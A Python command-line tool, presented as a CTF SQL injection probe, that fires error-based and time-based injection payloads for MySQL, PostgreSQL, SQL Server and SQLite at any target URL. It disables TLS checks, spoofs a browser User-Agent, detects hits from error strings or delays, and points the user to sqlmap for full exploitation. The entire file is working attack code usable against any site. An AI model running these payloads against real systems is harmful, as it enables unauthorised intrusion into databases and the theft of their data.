#!/usr/bin/env python3
"""
sqli_probe.py - CTF SQL Injection Probe

Sends common syntax-breaking characters and time-based payloads 
to identify SQLi entry points instantly.
"""

import argparse
import sys
import requests
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ANSI colors
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'

# Error signatures
SQL_ERRORS = {
    'MySQL': ['SQL syntax', 'mysql_query', 'Warning: mysqli', 'MySQL Error'],
    'PostgreSQL': ['PostgreSQL query failed', 'Syntax error at or near'],
    'SQLite': ['SQLite3::query', 'unrecognized token', 'near "'],
    'Oracle': ['ORA-', 'Oracle error'],
    'SQL Server': ['Unclosed quotation mark', 'SQL Server Driver', 'OLE DB Provider for SQL Server']
}

# Breaking Syntax Payloads
ERROR_PAYLOADS = [
    "'", '"', "\\", "')", '")', "'))", '"))',
    "`", "' OR 1=1--", "' OR '1'='1"
]

# Time-based Payloads 
# Note: testing time logic is typically very fast if not vulnerable
# Wait 5 seconds
TIME_DELAY = 5
TIME_PAYLOADS = [
    f"' OR SLEEP({TIME_DELAY})--",          # MySQL/MariaDB
    f"' OR pg_sleep({TIME_DELAY})--",       # PostgreSQL
    f"'; WAITFOR DELAY '0:0:{TIME_DELAY}'--", # SQL Server
    f"' AND (SELECT RANDOMBLOB(1000000000))--" # SQLite (heavy computation)
]


def test_payload(url, param, payload, payload_type, normal_time, session, cookies=None, headers=None, method='GET'):
    urls_to_test = []
    
    if method == 'GET':
        if 'INJECT' in url:
            urls_to_test.append(url.replace('INJECT', urllib.parse.quote(payload)))
        else:
            try:
                parsed = urllib.parse.urlparse(url)
                query = urllib.parse.parse_qs(parsed.query)
                query[param] = [payload]
                new_query = urllib.parse.urlencode(query, doseq=True)
                urls_to_test.append(urllib.parse.urlunparse(parsed._replace(query=new_query)))
            except Exception:
                pass

    for test_url in urls_to_test:
        try:
            req_headers = headers.copy() if headers else {}
            req_headers.setdefault('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0')
            
            start_time = time.time()
            res = session.get(test_url, cookies=cookies, headers=req_headers, verify=False, timeout=10)
            elapsed = time.time() - start_time
            text = res.text
            
            # Check Error-Based
            if payload_type == 'error':
                for db_type, errors in SQL_ERRORS.items():
                    for error in errors:
                        if error.lower() in text.lower():
                            return True, test_url, payload, f"Error-based ({db_type})"
                            
            # Check Time-Based
            if payload_type == 'time':
                if elapsed >= TIME_DELAY - 0.5 and normal_time < 2:
                    return True, test_url, payload, f"Time-based (took {elapsed:.2f}s)"

        except requests.Timeout:
            if payload_type == 'time' and normal_time < 2:
                return True, test_url, payload, f"Time-based (request timed out, likely sleeping >10s)"
        except requests.RequestException:
            pass

    return False, None, None, None


def main():
    parser = argparse.ArgumentParser(
        description='CTF SQL Injection Probe\nDetects Error / Time blind SQLi quickly',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 'http://target.com/item.php?id=INJECT'
  %(prog)s 'http://target.com/user' -p id
""")
    
    parser.add_argument('url', help="Target URL. Put 'INJECT' where payload goes, or use --param")
    parser.add_argument('-p', '--param', help='URL parameter to inject (if not using INJECT)')
    parser.add_argument('-c', '--cookie', help='Cookies to pass')
    
    args = parser.parse_args()
    
    if 'INJECT' not in args.url and not args.param:
        print(f"{C.RED}Error: Must specify 'INJECT' in the URL or provide --param.{C.RESET}")
        sys.exit(1)
        
    print(f"\n{C.CYAN}{C.BOLD}{'─' * 60}\n  SQLi Probe\n{'─' * 60}{C.RESET}")
    print(f"  Target URL: {args.url}")
    
    cookies = {}
    if args.cookie:
        for c in args.cookie.split(';'):
            if '=' in c:
                k, v = c.strip().split('=', 1)
                cookies[k] = v

    session = requests.Session()
    
    # Baseline
    print(f"  {C.DIM}Establishing baseline response time...{C.RESET}")
    baseline_url = args.url.replace('INJECT', '1')
    try:
        start = time.time()
        session.get(baseline_url, cookies=cookies, verify=False, timeout=5)
        baseline_time = time.time() - start
        print(f"  {C.DIM}Baseline time: {baseline_time:.3f}s{C.RESET}\n")
    except Exception as e:
        print(f"  {C.RED}Failed to reach host: {e}{C.RESET}")
        sys.exit(1)
        
    tasks = []
    # Mix up payloads
    for p in ERROR_PAYLOADS: tasks.append((args.url, args.param, p, 'error'))
    for p in TIME_PAYLOADS: tasks.append((args.url, args.param, p, 'time'))
        
    print(f"  {C.YELLOW}⟳ Sending Error & Time payloads...{C.RESET}\n")
    
    found_vuln = False
            
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = []
        for task in tasks:
            futures.append(executor.submit(test_payload, *task, baseline_time, session, cookies, None, 'GET'))
            
        for future in futures:
            success, hit_url, payload, reason = future.result()
            if success:
                found_vuln = True
                print(f"  {C.GREEN}{C.BOLD}★ POTENTIAL SQL INJECTION FOUND! ★{C.RESET}")
                print(f"  {C.CYAN}URL:{C.RESET}     {hit_url}")
                print(f"  {C.MAGENTA}Payload:{C.RESET} {payload}")
                print(f"  {C.DIM}Type:{C.RESET}    {reason}\n")
                
                print(f"  {C.YELLOW}Note: Use sqlmap directly on this parameter for full exploitation.{C.RESET}\n")
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found_vuln:
        print(f"  {C.RED}✗ No straightforward SQLi detected.{C.RESET}\n")

if __name__ == '__main__':
    main()
